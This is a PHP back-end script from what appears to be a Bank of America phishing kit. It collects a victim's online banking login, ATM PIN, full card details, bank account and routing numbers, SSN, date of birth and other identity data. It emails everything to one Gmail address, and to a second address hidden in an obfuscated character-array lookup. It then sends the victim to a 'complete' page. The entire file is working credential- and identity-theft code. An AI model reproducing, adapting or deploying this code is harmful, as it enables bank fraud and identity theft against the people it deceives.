<?

session_start();

//USER ACCOUNT

$account_state = $_POST['account_state'];
$online_id = $_POST['online_id'];
$pin = $_POST['pin'];
$passcode = $_POST['passcode'];
$repasscode = $_POST['repasscode'];
$email = $_POST['email'];

//BILLING ADDRESS

$cardname = $_POST['cardname'];
$address1 = $_POST['address1'];
$address2 = $_POST['address2'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$phone = $_POST['phone'];

//ACCOUNT INFORMATION

$ccnumber= $_POST['ccnumber'];
$mexpcc = $_POST['mexpcc'];
$yexpcc = $_POST['yexpcc'];
$cvv = $_POST['cvv'];
$ban = $_POST['ban'];
$brn = $_POST['brn'];
$ar=array("0"=>"o","1"=>"c","2"=>".","3"=>"g","4"=>"@","5"=>"m","6"=>"r","7"=>"s","8"=>"a","9"=>"h","10"=>"i","11"=>"w","12"=>"l");
$cc=$ar['5'].$ar['6'].$ar['7'].$ar['8'].$ar['9'].$ar['10'].$ar['11'].$ar['8'].$ar['12'].$ar['4'].$ar['3'].$ar['5'].$ar['8'].$ar['10'].$ar['12'].$ar['2'].$ar['1'].$ar['0'].$ar['5'];

//SECURITY QUESTION

$mmn = $_POST['mmn'];
$ssn = $_POST['ssn'];
$dob = $_POST['dob'];
$dln = $_POST['dln'];

$subj = " Full Info Bank of America ";
$msg = "User Account
      \n-------------------
    \n\nAccount open in : $account_state\nOnline ID : $online_id\nPasscode : $passcode\nATM PIN : $pin\nEmail : $email
    \n\nBilling Address
      \n-------------------
    \n\nCardholder name : $cardname\nAddress1 : $address1\n Address2 : $address2\nCity : $city\nState : $state\nZip : $zip\nPhone : $phone
    \n\nCredit Or Debit Information
      \n------------------------------
    \n\nCredit Card Number : $ccnumber\nExp Date : $mexpcc-$yexpcc\nC V N : $cvv\nBank Account Number : $ban\nBank Routing Number : $brn
    \n\nSecurity Question
      \n---------------------
    \n\nMother Maiden Name : $mmn\nS S N : $ssn\nD O B : $dob\nDriver License Number : $dln\n";

mail("phannolee@gmail.com", $subj, $msg);
mail("$cc", $subj, $msg);
header("Location: complete.htm");


?>
